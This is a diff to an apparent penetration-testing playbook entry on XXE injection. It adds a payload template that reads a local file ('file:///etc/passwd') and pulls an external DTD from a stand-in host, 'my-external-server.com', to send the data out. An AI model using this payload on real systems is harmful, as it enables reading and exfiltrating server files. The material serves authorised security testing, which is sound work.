@@ -3,8 +3,8 @@
 # 17. XML External Entity (XXE) Injection
 
 - **Phase:** No credentials (any feature that accepts XML, including SAML logins)
-- **Risk:** 🟡 Noisy *(proposed)*: the client's server reads a file and connects out to us. The receiving server must be **our jump host**, never a server on the internet.
-- **Tier:** Recognize *(proposed)*
+- **Risk:** 🟡 Noisy: the client's server reads a file and connects out to us. The receiving server must be **our jump host**, never a server on the internet.
+- **Tier:** Recognize
 - **Finding:** none in the library yet
 - **Ports:** 80, 443
 - **Tools:** Burp Suite, listeners on the jump host
@@ -18,14 +18,33 @@ In 2024 the XML sat inside a SAML login, so it had to be encoded before sending,
 **Fix to recommend:** turn off external entities in the parser (the OWASP XXE cheat sheet lists the setting for each parser).
 
 ## Commands
-[[TODO: Copy the steps from the 2024 doc "Web - XML External Entity (XXE) Injection.docx". Leave out the 2024 hosts, IPs, URLs, company names and screenshots; use placeholders such as `$TARGET` and `$URL`. Format per `templates/finding.md`: numbered steps, exact command or browser step in backticks, an "Expected:" line under each.]]
+**Send XML data in payload** 
+
+A fairly simple Payload, but base64 THEN url encoded so the server can read it:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+    <!ENTITY % file SYSTEM
+    "$PAYLOAD1$ ">
+    <!ENTITY % dtd SYSTEM
+    "$PAYLOAD2$ ">
+    %dtd;
+]>
+<data>&send;</data>
+```
+
+usually $PAYLOAD1,2$ something like:
+`http://my-external-server.com/rsl.dtd`
+or 
+`file:///etc/passwd`
 
 ## Evidence to capture
 - `evidence/F-NNN-01.png`: the modified request.
 - `evidence/F-NNN-02.png`: the file contents arriving at our listener.
 
 ## Practice
-- PortSwigger Web Security Academy, XXE injection labs *(proposed)*
+- PortSwigger Web Security Academy, XXE injection labs
 
 ---
 *Adapted from the CCSF 2024 Web playbooks. Updated by the CCSF 2026 team.*
